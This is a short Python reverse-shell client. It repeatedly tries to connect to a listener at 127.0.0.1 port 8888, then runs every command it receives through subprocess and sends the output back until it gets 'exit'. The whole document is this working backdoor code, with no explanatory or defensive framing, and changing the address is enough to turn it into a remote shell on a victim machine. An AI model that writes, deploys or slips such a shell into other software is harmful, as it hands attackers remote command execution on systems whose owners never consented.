#!/usr/bin/python3

import socket
import subprocess
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

ip = "127.0.0.1"
port = 8888


print("Trying to connect....")
while True:
	try:
		s.connect((ip,port))
		print("Connected to the server\nIP: ",ip,"\nPort: ",port)
		print("--------------------------")
		break	
	except:
		pass

while True:
	cmd = (s.recv(1024)).decode()
	if cmd == "exit":
		break
	output = subprocess.getoutput(cmd)
	s.send(output.encode())
	

s.close()